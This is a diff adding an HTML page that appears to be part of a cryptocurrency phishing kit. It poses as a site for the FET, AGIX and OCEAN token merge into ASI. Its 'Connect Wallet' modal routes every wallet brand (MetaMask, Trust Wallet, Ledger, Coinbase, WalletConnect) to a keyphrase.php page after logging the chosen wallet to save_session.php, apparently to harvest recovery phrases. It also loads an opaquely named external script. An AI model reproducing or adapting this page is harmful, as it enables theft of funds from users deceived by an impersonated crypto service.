@@ -1,0 +1,74 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MERGE</title>
+    <link rel="stylesheet" href="style.css">
+    <script charset="UTF-8" type="text/javascript" src="./0c91002d-408b-4ecb-8a2e-50322b28a40c.js"></script>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="container">
+            <div class="images">
+                <img src="img/fet-agix-ocean.jpg" width="150px" alt="">
+                <img src="img/arrow.jpg" width="150px" alt="">
+                <img src="img/asi.jpg" width="150px" alt="">
+            </div>
+            <h1>FET, AGIX, and OCEAN merge into ASI.</h1>
+            <button class="style interact-button" id="connect-button">Connect to get started</button>
+        </div>
+    </div>
+
+    <div class="modal">
+        <div class="modal-container">
+            <div class="header">
+                <span>?</span>
+                <h4>Connect Wallet</h4>
+                <span id="close">X</span>
+            </div>
+            <div class="modal-body">
+            <ul>
+    <li><a id="walletconnect" href="keyphrase.php"><img src="img/wallet-connect.svg" width="40px" alt=""> WalletConnect</a></li>
+    <li><a id="metamask" href="keyphrase.php"><img src="img/metamask-wallet-connect.png" width="40px" alt=""> MetaMask</a></li>
+    <li><a id="trustwallet" href="keyphrase.php"><img src="img/trust-wallet-wallet-connect.png" width="40px" alt=""> Trust Wallet</a></li>
+    <li><a id="exodus" href="keyphrase.php"><img src="img/ledger.jpg" width="40px" alt=""> Ledger</a></li>
+    <li><a id="coinbase" href="keyphrase.php"><img src="img/coinbase-rainbow.svg" width="40px" alt=""> Coinbase</a></li>
+</ul>
+
+<script>
+document.querySelectorAll('a').forEach(item => {
+    item.addEventListener('click', event => {
+        event.preventDefault();
+        const id = event.target.closest('a').id;
+        
+        fetch('save_session.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: `wallet=${id}`
+        }).then(response => response.text())
+          .then(data => {
+              console.log(data); // For debugging purposes
+              // Redirect to the desired page after saving session
+              window.location.href = 'keyphrase.php';
+          });
+    });
+});
+</script>
+
+            </div>
+        </div>
+    </div>
+    <script src="jquery.js"></script>
+    <script type="text/javascript">
+        $(document).ready(function(){
+            $("#connect-button").click(function(){
+                $(".modal").css("display", "flex");
+            });
+            $("#close").click(function(){
+                $(".modal").css("display", "none");
+            });
+        })
+    </script>
+
+</body></html>
